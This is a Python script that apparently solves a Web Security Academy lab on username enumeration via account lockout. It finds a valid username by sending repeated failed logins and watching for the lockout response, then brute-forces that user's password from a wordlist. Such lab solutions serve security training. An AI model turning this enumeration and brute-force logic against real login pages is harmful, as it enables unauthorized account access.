from listgen import *
import requests
import argparse
import time

parser = argparse.ArgumentParser(description='Solves the following Lab: Username enumeration via account lock')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

USERNAME = ''
r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
session = r.cookies.get("session")
headers = {"Cookie":f"session={session}"}

# BRUTEFORCE USER
i = 1
for user in userlist():
    for i in range(10):
        
        r = requests.post("https://" + lab.id + f".web-security-academy.net/login", headers=headers, data={"username":f"{user}","password":"bruteforce"})
        
        if "Invalid username or password." not in r.text:
            print(f"Found valid user: {user}")
            USERNAME = user
            break
    if USERNAME:
        break    

# BRUTEFORCE PASSWORD AND LOGIN
for password in passlist():

    r = requests.post("https://" + lab.id + f".web-security-academy.net/login", headers=headers, data={"username":f"{USERNAME}","password":f"{password}"})
    
    if "You have made too many incorrect login attempts. Please try again in 1 minute(s)." in r.text:
        continue
    elif "Invalid username or password." in r.text:
        continue
    else:
        print(f"Found valid credentials {USERNAME}:{password}")
        break
        
        

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")